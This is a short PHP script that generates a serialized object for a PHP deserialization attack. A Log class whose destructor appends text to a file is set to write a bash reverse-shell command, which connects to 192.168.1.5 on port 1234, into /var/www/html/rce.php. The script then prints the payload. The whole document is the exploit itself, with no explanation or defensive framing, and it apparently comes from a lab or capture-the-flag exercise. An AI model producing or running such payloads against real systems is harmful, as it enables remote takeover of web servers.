<?php
class Log {
        public function __construct($f, $m) {
            $this->f = $f;
            $this->m = $m;
        }
        
        public function __destruct() {
            file_put_contents($this->f, $this->m, FILE_APPEND);
        }
    }

$usr_obj = new Log('/var/www/html/rce.php', 'bash -c "bash -i >& /dev/tcp/192.168.1.5/1234 0>&1"');
echo serialize($usr_obj);
?>
